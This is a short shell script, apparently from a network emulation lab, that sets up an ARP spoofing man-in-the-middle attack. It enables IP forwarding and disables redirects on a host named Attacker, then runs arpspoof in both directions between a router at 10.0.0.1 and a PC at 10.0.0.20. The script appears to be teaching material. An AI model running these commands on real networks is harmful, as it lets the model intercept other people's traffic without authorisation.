#!/bin/sh

# enable IP packet forwarding
himage Attacker sysctl -w net.inet.ip.forwarding=1
# disable sending IP redirects
himage Attacker sysctl -w net.inet.ip.redirect=0

# tell the Router that the PC has the Attacker MAC
himage Attacker arpspoof -i eth0 -t 10.0.0.1 10.0.0.20 2> /dev/null &
# tell the PC that the router has the Attacker MAC
himage Attacker arpspoof -i eth0 -t 10.0.0.20 10.0.0.1 2> /dev/null &
